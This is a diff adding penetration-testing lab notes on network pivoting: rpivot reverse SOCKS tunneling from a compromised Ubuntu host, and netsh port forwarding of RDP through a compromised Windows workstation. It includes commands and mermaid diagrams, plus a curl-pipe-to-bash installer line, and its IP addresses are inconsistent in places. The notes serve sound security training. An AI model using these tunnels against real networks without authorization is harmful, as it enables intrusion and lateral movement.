@@ -1789,4 +1789,180 @@ We can now use any tool directly without using proxychains.
 
 </details>
 
+<details>
+<summary><h2>Web Server Pivoting with Rpivot</h2></summary>
+
+**[Rpivot](https://github.com/klsecservices/rpivot)** is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.
+
+```mermaid
+flowchart LR
+    %% Nodes
+    A["<b>🔴 Attack Host</b><br/>10.10.15.5"]
+    EXT["<b>☁️ External Network</b><br/>10.129.110.0"]
+    U["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129<br/><i>Dual Homed</i>"]
+    W["<b>🖥️ Victim Server (Webserver)</b><br/>172.16.5.135<br/>Webserver on Port 80"]
+    INT["<b>🔒 Internal Network</b><br/>172.16.5.0"]
+    
+    %% Connections
+    A -.->|"<b>Connect</b>"| EXT
+    EXT -.->|"<b>Access</b>"| U
+    U -.->|"<b>Pivot</b>"| INT
+    INT -.->|"<b>Access</b>"| W
+    
+    %% Styling
+    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
+    style EXT fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
+    style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    style W fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    style INT fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+    
+    %% Link styling
+    linkStyle 0 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+    linkStyle 1 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+    linkStyle 2 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+    linkStyle 3 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+```
+
+**Cloning rpivot**
+```bash
+git clone https://github.com/klsecservices/rpivot.git
+```
+
+
+**Installation of Python2.7**
+```bash
+curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
+echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(pyenv init -)"' >> ~/.bashrc
+source ~/.bashrc
+pyenv install 2.7
+pyenv shell 2.7
+```
+
+We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
+
+**Running server.py from the Attack Host**
+```bash
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+**Setting SOCKS5**
+```bash
+sudo sed -i '/^socks/d' /etc/proxychains.conf && echo 'socks5 127.0.0.1 9050' | sudo tee -a /etc/proxychains.conf
+```
+
+Before running client.py we will need to transfer rpivot folder to the target. We can do this using this SCP command:
+
+**Transferring rpivot to the Target**
+```bash
+scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
+```
+
+**Running client.py from Pivot Target**
+```bash
+python2.7 client.py --server-ip 10.10.15.165 --server-port 9999
+```
+```bash
+# Backconnecting to server 10.10.14.18 port 9999
+
+# New connection from host 10.129.202.64, source port 35226
+```
+
+We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.
+
+Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.
+
+**Browsing to the Target Webserver using Proxychains**
+```bash
+proxychains firefox-esr 172.16.5.135:80
+```
+
+Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
+
+**Connecting to a Web Server using HTTP-Proxy & NTLM Auth**
+```bash
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+```
+
+</details>
+
+<details>
+<summary><h2>Port Forwarding with Windows Netsh</h2></summary>
+
+**[Netsh](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh)** is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
+
+* Finding routes
+* Viewing the firewall configuration
+* Adding proxies
+* Creating port forwarding rules
+
+Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`, `172.16.5.25`). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.
+
+```mermaid
+flowchart LR
+    %% Nodes
+    A["<b>🔴 Attack Host</b><br/>10.10.15.5"]
+    
+    subgraph PIVOT[" "]
+        direction TB
+        L["<b>Listen on</b><br/>10.129.15.150:<span style='color:#FFD700'>8080</span>"]
+        N["<b>Netsh.exe</b>"]
+        F["<b>Forward to</b><br/>172.16.5.25:<span style='color:#FFD700'>3389</span>"]
+        
+        L -.->|" "| N
+        N -.->|" "| F
+    end
+    
+    subgraph VICTIMS[" "]
+        direction LR
+        W1["<b>🖥️ Windows10 User(pwn)</b><br/>10.129.15.150<br/>172.16.5.19"]
+        W2["<b>🖥️ Windows Server</b><br/>172.16.5.25<br/>RDP Service"]
+    end
+    
+    %% Connections
+    A -.->|"<b>RDP Request</b>"| L
+    F -.->|"<b>Forwards RDP<br/>Service Request</b>"| W1
+    W1 -.->|"<b>RDP Connection</b>"| W2
+    
+    %% Styling
+    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
+    style L fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+    style N fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
+    style F fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+    style W1 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    style W2 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    style PIVOT fill:none,stroke:#6c8ebf,stroke-width:2px,stroke-dasharray:5
+    style VICTIMS fill:none,stroke:#90EE90,stroke-width:2px,stroke-dasharray:5
+    
+    %% Link styling
+    linkStyle 0 stroke:#FFD700,stroke-width:2px,stroke-dasharray:3
+    linkStyle 1 stroke:#FFD700,stroke-width:2px,stroke-dasharray:3
+    linkStyle 2 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+    linkStyle 3 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+    linkStyle 4 stroke:#90EE90,stroke-width:3px,stroke-dasharray:5
+```
+
+We can use *netsh.exe* to forward all data received on a specific port (say 8080) to a remote host on a remote port.
+
+**Using Netsh.exe to Port Forward**
+
+```cmd
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+```
+
+**Verifying Port Forward**
+
+```cmd
+C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+10.129.15.150   8080        172.16.5.25     3389
+```
+
+</details>
+
 </details>
